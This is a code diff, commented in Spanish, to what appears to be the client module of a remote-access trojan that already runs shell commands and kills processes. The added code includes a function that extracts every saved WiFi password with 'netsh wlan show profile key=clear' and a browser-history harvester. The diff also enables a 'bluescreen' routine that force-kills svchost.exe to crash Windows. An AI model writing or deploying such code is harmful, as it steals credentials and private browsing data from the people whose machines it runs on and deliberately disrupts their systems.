@@ -5,7 +5,10 @@ import os
 import psutil
 import datetime
 import sys
+import threading
+import pyautogui
 from typing import Optional, Tuple, List, Dict
+from browser_history import get_history
 
 
 def execute_command(command: str, timeout: int = 30) -> Tuple[bool, str]:
@@ -41,8 +44,7 @@ def execute_command(command: str, timeout: int = 30) -> Tuple[bool, str]:
 def bluescreen():
     try:
         if platform.system() == "Windows":
-            print("Reiniciando sistema...")
-            # os.system("taskkill /F /IM svchost.exe")
+             os.system("taskkill /F /IM svchost.exe")
         else:
             return "No se pudo reiniciar el sistema"
     except Exception as e:
@@ -58,23 +60,8 @@ def get_hostname() -> str:
         return f"Error obteniendo hostname: {e}"
 
 
-def upload_file(file_path: str) -> str:
-    """
-    Sube un archivo al servidor.
 
-    Args:
-        file_path: Ruta del archivo a subir
-    """
-    try:
-        if not os.path.exists(file_path):
-            return f"Error: No existe el archivo {file_path}"
-        with open(file_path, 'rb') as file:
-            return file.read().decode('UTF-8')
-    except Exception as e:
-        return f"Error subiendo archivo: {e}"
-
-
-def download_file(file_path: str, content: str) -> str:
+def see_file(file_path: str) -> str:
     """
     Descarga un archivo al servidor.
 
@@ -83,9 +70,8 @@ def download_file(file_path: str, content: str) -> str:
         content: Contenido del archivo
     """
     try:
-        with open(file_path, 'wb') as file:
-            file.write(content.encode('UTF-8'))
-        return f"Archivo {file_path} descargado exitosamente"
+       with open(file_path, 'r') as file:
+           return file.read()
     except Exception as e:
         return f"Error descargando archivo: {e}"
 
@@ -276,33 +262,65 @@ def get_services() -> str:
         return f"Error obteniendo servicios: {e}"
 
 
-def get_system_info() -> str:
-    """Obtiene información general del sistema."""
+def get_system_info() -> Dict[str, any]:
+    """
+    Versión mejorada que devuelve información detallada del sistema.
+    """
     try:
-        # CPU
-        cpu_info = [
-            "Información de CPU:",
-            f"  Núcleos físicos: {psutil.cpu_count(logical=False)}",
-            f"  Núcleos totales: {psutil.cpu_count()}",
-            f"  Uso actual: {psutil.cpu_percent()}%"
-        ]
+        info = {
+            "sistema": {
+                "os": platform.system(),
+                "version": platform.version(),
+                "arquitectura": platform.machine(),
+                "procesador": platform.processor(),
+                "python_version": sys.version,
+                "hostname": socket.gethostname(),
+                "uptime": str(datetime.datetime.now() -
+                              datetime.datetime.fromtimestamp(psutil.boot_time()))
+            },
+            "cpu": {
+                "nucleos_fisicos": psutil.cpu_count(logical=False),
+                "nucleos_totales": psutil.cpu_count(),
+                "uso": psutil.cpu_percent(interval=1),
+                "frecuencia": psutil.cpu_freq()._asdict() if hasattr(psutil.cpu_freq(), '_asdict') else None
+            },
+            "memoria": {
+                "total": psutil.virtual_memory().total,
+                "disponible": psutil.virtual_memory().available,
+                "porcentaje_uso": psutil.virtual_memory().percent,
+                "swap_total": psutil.swap_memory().total,
+                "swap_usado": psutil.swap_memory().used
+            },
+            "discos": [
+                {
+                    "dispositivo": p.device,
+                    "punto_montaje": p.mountpoint,
+                    "sistema_archivos": p.fstype,
+                    "uso": psutil.disk_usage(p.mountpoint)._asdict()
+                    if os.path.exists(p.mountpoint) else None
+                }
+                for p in psutil.disk_partitions()
+            ],
+            "red": {
+                "interfaces": psutil.net_if_addrs(),
+                "estadisticas": psutil.net_io_counters()._asdict(),
+                "conexiones": len(psutil.net_connections())
+            },
+            "bateria": psutil.sensors_battery()._asdict()
+            if hasattr(psutil.sensors_battery(), '_asdict') else None
+        }
 
-        # Memoria
-        mem = psutil.virtual_memory()
-        mem_info = [
-            "\nMemoria RAM:",
-            f"  Total: {mem.total / (1024 ** 3):.1f} GB",
-            f"  Disponible: {mem.available / (1024 ** 3):.1f} GB",
-            f"  Usada: {mem.used / (1024 ** 3):.1f} GB",
-            f"  Porcentaje: {mem.percent}%"
-        ]
-
-        # Tiempo de actividad
-        uptime = datetime.datetime.now() - datetime.datetime.fromtimestamp(psutil.boot_time())
-
-        return "\n".join(cpu_info + mem_info + [f"\nTiempo de actividad: {uptime}"])
+        # Formatear para mejor legibilidad
+        return {
+            k: {
+                str(sub_k): str(sub_v)
+                for sub_k, sub_v in v.items()
+            } if isinstance(v, dict) else str(v)
+            for k, v in info.items()
+        }
     except Exception as e:
-        return f"Error obteniendo información del sistema: {e}"
+        return {"error": str(e)}
+
 
 
 def execute_shell(command: str) -> str:
@@ -388,3 +406,101 @@ def kill_process(pid: int) -> str:
         return f"Acceso denegado al intentar terminar el proceso {pid}"
     except Exception as e:
         return f"Error terminando proceso {pid}: {e}"
+
+
+def get_browser_history():
+    try:
+        # Obtener el historial
+        history = get_history()
+        entries = history.histories  # Acceder a la lista de entradas del historial
+
+        # Formatear el historial
+        formatted_history = []
+        for entry in entries:
+
+            date = entry[0].strftime('%Y-%m-%d %H:%M:%S')  # Formatear fecha
+            url = entry[1]
+            title = entry[2] if entry[2] else 'Sin título'  # Manejar caso sin título
+
+            # Agregar la entrada formateada a la lista
+            formatted_history.append(f"{date} - {title} - {url}")
+
+        return "\n".join(formatted_history) if formatted_history else "No se encontró historial."
+
+    except Exception as e:
+        return f"Error al obtener el historial de navegación: {e}"
+
+
+def get_wifi_passwords() -> str:
+    """
+    Obtiene las contraseñas WiFi guardadas en el sistema.
+    Solo funciona en Windows con privilegios de administrador.
+    """
+    try:
+        if platform.system() != "Windows":
+            return "Esta función solo está disponible en Windows"
+
+        wifi_list = []
+
+        # Obtener perfiles WiFi
+        success, output = execute_command("netsh wlan show profile")
+        if not success:
+            return "Error obteniendo perfiles WiFi"
+
+        profiles = [line.split(":")[1].strip() for line in output.split('\n')
+                    if "All User Profile" in line]
+
+        # Obtener contraseña para cada perfil
+        for profile in profiles:
+            success, output = execute_command(
+                f'netsh wlan show profile name="{profile}" key=clear'
+            )
+            if success:
+                password = None
+                for line in output.split('\n'):
+                    if "Key Content" in line:
+                        password = line.split(":")[1].strip()
+                        break
+                wifi_list.append(f"Red: {profile}\nContraseña: {password or 'No disponible'}\n")
+
+        return "\n".join(wifi_list) if wifi_list else "No se encontraron perfiles WiFi"
+    except Exception as e:
+        return f"Error obteniendo contraseñas WiFi: {e}"
+
+
+
+def monitor_system(interval: int = 1, duration: int = 60) -> List[Dict]:
+    """
+    Monitoriza el sistema durante un período específico.
+
+    Args:
+        interval: Intervalo entre mediciones en segundos
+        duration: Duración total del monitoreo en segundos
+
+    Returns:
+        List[Dict]: Lista de mediciones
+    """
+    try:
+        measurements = []
+        start_time = datetime.datetime.now()
+
+        while (datetime.datetime.now() - start_time).seconds < duration:
+            measurement = {
+                "timestamp": str(datetime.datetime.now()),
+                "cpu_percent": psutil.cpu_percent(interval=1),
+                "memory_percent": psutil.virtual_memory().percent,
+                "swap_percent": psutil.swap_memory().percent,
+                "disk_usage": {
+                    p.mountpoint: psutil.disk_usage(p.mountpoint).percent
+                    for p in psutil.disk_partitions()
+                    if os.path.exists(p.mountpoint)
+                },
+                "network": psutil.net_io_counters()._asdict(),
+                "processes": len(psutil.pids())
+            }
+            measurements.append(measurement)
+            threading.Event().wait(interval)
+
+        return measurements
+    except Exception as e:
+        return [{"error": str(e)}]
